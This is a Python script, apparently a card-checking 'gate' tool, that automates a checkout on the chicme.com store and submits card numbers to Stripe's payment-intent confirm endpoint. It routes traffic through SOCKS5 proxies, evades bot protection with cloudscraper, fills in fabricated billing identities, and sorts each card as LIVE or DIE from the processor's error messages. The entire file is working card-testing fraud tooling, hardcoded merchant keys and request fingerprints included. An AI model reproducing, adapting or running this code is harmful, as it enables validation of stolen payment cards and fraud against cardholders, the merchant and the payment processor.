
   
import json
import cloudscraper
from time import sleep
from urllib.parse import quote
from random import randint
from dependencie.infobill import infobill

from model.models import gateData

class CoreGateCode:
    def __init__(self, cardID):
        self.cardID = cardID
        self.cardIDx2 = ""
        self.billx = infobill()
    def getStr(self,data,inicio,final):
        strx1 = data.split(inicio)
        strx2 = strx1[1].split(final)
        return strx2[0]
    def __valiDCardId(self):
        if self.cardID == 'visa':
            self.cardIDx2 = 'visa'
        elif self.cardID == 'mc':
            self.cardIDx2 = 'master'
        elif self.cardID == 'amex':
            self.cardIDx2 = 'american_express'
        elif self.cardID == 'discovery':
            self.cardIDx2 = 'discover'

    def processCodeGate(self,cc,dataGate:gateData):
        self.__valiDCardId()
        cc1 = cc.ccnum[0:6]
        cc2 = cc.ccnum[12:16]



        proxies = {
            'http': f'socks5://{dataGate.proxy}',
            'https': f'socks5://{dataGate.proxy}'
        }
        timeout = 40

        cs = cloudscraper.create_scraper(
            browser={
                'browser': 'firefox',
                'platform': 'windows',
                'mobile': False

            },
            debug=False

        )


    #datext

        #cs.proxies.update(proxies)
        try:
            status = dict()


            url="https://www.chicme.com/product/juego-de-anillos-apilables-de-moda-de-4-piezas/e813109f-b633-417b-b9b8-e27b7616c3ee.html?gf=sort_real_price%20asc~~2"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"none",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)



            clientid = datac.cookies.get("clientId")
            vaidx = self.getStr(datac.text, 'selectedVariant = {"id":"', '"')
            uniid = self.getStr(datac.text, 'unifiedId":"', '"')

            winsecret = self.getStr(datac.text, "window.secret = '", "'")

            url="https://www.chicme.com/v9/shopping-cart/add-product"
            headers={
            "Accept":"application/json, text/javascript, */*; q=0.01",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/product/juego-de-anillos-apilables-de-moda-de-4-piezas/e813109f-b633-417b-b9b8-e27b7616c3ee.html?gf=sort_real_price%20asc~~2",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
            "appVersion":"3.5.8",
            "deviceType":"pc",
            "domain":"www.chicme.com",
            "wid":clientid,
            "suid":"",
            "xtoken":winsecret,
            "website":"1",
            "X-Requested-With":"XMLHttpRequest",
            "Origin":"https://www.chicme.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            data='variantId='+vaidx+'&unifiedId='+uniid+'&quantity=1&warehouseId=&shippedCountryCode=&limitedTimePurchasePromotion=&pointsMallSales=false'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            url="https://www.chicme.com/cart"
            headers={

            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/product/juego-de-anillos-apilables-de-moda-de-4-piezas/e813109f-b633-417b-b9b8-e27b7616c3ee.html?gf=sort_real_price%20asc~~2",
            "DNT":"1",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "Sec-Fetch-Dest":"document",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-Site":"same-origin",
            'Sec-Fetch-User':'?1'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)




            url="https://www.chicme.com/v9/pay/save-address"
            headers={

            "Accept":"application/json, text/plain, */*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/cart/checkout",
            "Content-Type":"application/x-www-form-urlencoded",
            "appVersion":"4.4.11",
            "deviceType":"pc",
            "xtoken":winsecret,
            "wid":clientid,
            "StemFrom":"",
            "accessToken":"",
            "x-width":"1680",
            "x-height":"1050",
            "javaenabled":"false",
            "x-colordepth":"24",
            "x-time-zone-offset":"360",
            "Origin":"https://www.chicme.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='name='+self.billx.nameFirs+'%20'+self.billx.nameLast+'&streetAddress1='+self.billx.address+'&unit=&city='+self.billx.city+'&zipCode='+self.billx.zipcode+'&state='+self.billx.estado2+'&country=US&phoneNumber='+self.billx.phone1+'&defaultAddress=true&phoneArea=&cpf=&email='+self.billx.emailx+'%40hotmail.com&firstName='+self.billx.nameFirs+'&lastName='+self.billx.nameLast
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://www.chicme.com/v9/shopping-cart/anon/use-pay-method?payMethod=88"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json, text/plain, */*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/cart/checkout",
            "appVersion":"4.4.11",
            "deviceType":"pc",
            "xtoken":winsecret,
            "wid":clientid,
            "StemFrom":"",
            "accessToken":"",
            "x-width":"1680",
            "x-height":"1050",
            "javaenabled":"false",
            "x-colordepth":"24",
            "x-time-zone-offset":"360",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-origin'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)



            url="https://www.chicme.com/v9/pay/place-order?payMethod=88&_=1650686821669"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json, text/plain, */*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/cart/checkout",
            "appVersion":"4.4.11",
            "deviceType":"pc",
            "xtoken":winsecret,
            "wid":clientid,
            "StemFrom":"",
            "accessToken":"",
            "x-width":"1680",
            "x-height":"1050",
            "javaenabled":"false",
            "x-colordepth":"24",
            "x-time-zone-offset":"360",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)

            orderid = datac.json()['result']['orderId']



            url="https://www.chicme.com/v9/stripe/open-order"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json, text/plain, */*",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Referer":"https://www.chicme.com/cart/credit/01008407183?payMethod=88",
            "Content-Type":"application/x-www-form-urlencoded",
            "appVersion":"4.4.11",
            "deviceType":"pc",
            "xtoken":winsecret,
            "wid":clientid,
            "StemFrom":"",
            "accessToken":"",
            "x-width":"1680",
            "x-height":"1050",
            "javaenabled":"false",
            "x-colordepth":"24",
            "x-time-zone-offset":"360",
            "Origin":"https://www.chicme.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-origin",
            'TE':'trailers'
            }
            data='orderId='+orderid+'&payMethod=88'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)

            apix = datac.json()['result']['openOrderResponse']['pid']
            clientesecret = datac.json()['result']['openOrderResponse']['clientSecret']

            url="https://r.stripe.com/0"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://js.stripe.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://js.stripe.com/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site":"same-site",
            'TE':'trailers'
            }
            data='event_name=elements.confirm_payment_intent&client_id=stripe-js&created=1650687214039&event_count=47&os=MacOS&browserFamily=Firefox&event_id=c389b6b9-aafa-4d1f-8956-480bdcfa23dd&version=16eb14616&key=pk_live_51JZ7ULFigPqU9Gi2mgfsxIpnvP93kORxncYJrgRmpnT9HKsleAJqc1yA3UsHVpmU1IYui6mhPCyCJK2aY8K0QvBm00mmCpnYGd&key_mode=live&referrer=https%3A%2F%2Fwww.chicme.com&stripe_js_id=b4760b28-d763-4377-9834-dfb8cc058346&controller_load_time=1650686827839&wrapper=react-stripe-js&wrapper_version=1.4.1&es_module=true&es_module_version=1.16.0&frame_width=1680&element=cardNumber'
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)



            url="https://api.stripe.com/v1/payment_intents/"+apix+"/confirm"
            headers={
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Accept":"application/json",
            "Accept-Language":"en-US,en;q=0.5",
            "Accept-Encoding":"gzip, deflate, br",
            "Content-Type":"application/x-www-form-urlencoded",
            "Origin":"https://js.stripe.com",
            "DNT":"1",
            "Connection":"keep-alive",
            "Referer":"https://js.stripe.com/",
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            'Sec-Fetch-Site':'same-site'
            }
            data='payment_method_data[type]=card&payment_method_data[billing_details][name]='+self.billx.nameFirs+'+'+self.billx.nameLast+'&payment_method_data[billing_details][email]='+self.billx.emailx+'%40hotmail.com&payment_method_data[billing_details][phone]='+self.billx.phone1+'&payment_method_data[billing_details][address][city]='+self.billx.city+'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]='+self.billx.address+'&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]='+self.billx.zipcode+'&payment_method_data[billing_details][address][state]='+self.billx.estado2+'&payment_method_data[card][number]='+cc.ccnum+'&payment_method_data[card][cvc]='+cc.cv2+'&payment_method_data[card][exp_month]='+cc.expm+'&payment_method_data[card][exp_year]='+cc.expy+'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F16eb14616%3B+stripe-js-v3%2F16eb14616&payment_method_data[time_on_page]=387714&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JZ7ULFigPqU9Gi2mgfsxIpnvP93kORxncYJrgRmpnT9HKsleAJqc1yA3UsHVpmU1IYui6mhPCyCJK2aY8K0QvBm00mmCpnYGd&client_secret='+clientesecret
            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)


            if "Your card's security code is incorrect." in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: LIVE [CVC MISMATCH] """,'proxy':dataGate.proxy,'datext':None}
            elif 'status": "requires_action' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: LIVE """,'proxy':dataGate.proxy,'datext':None}
            elif 'status": "balance-insufficient' in datac.text:
                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: LIVE [SIN FONDOS] """,'proxy':dataGate.proxy,'datext':None}
            elif 'Your card was declined.' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE """,'proxy':dataGate.proxy,'datext':None}
            elif 'card-decline-rate-limit-exceeded' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE [CC RECHECK] """,'proxy':dataGate.proxy,'datext':None}
            elif 'Your card does not support this type of purchase' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE """,'proxy':dataGate.proxy,'datext':None}
            elif 'Your card number is incorrect' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE [CC INVALIDA] """,'proxy':dataGate.proxy,'datext':None}
            elif 'Invalid account' in datac.text:
                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: DIE """,'proxy':dataGate.proxy,'datext':None}
            else:
                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': " ===>"+ dataGate.cc,'proxy':dataGate.proxy,'datext':None}

            return status
        except Exception as e:
            print(e,'que pasox')
            return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
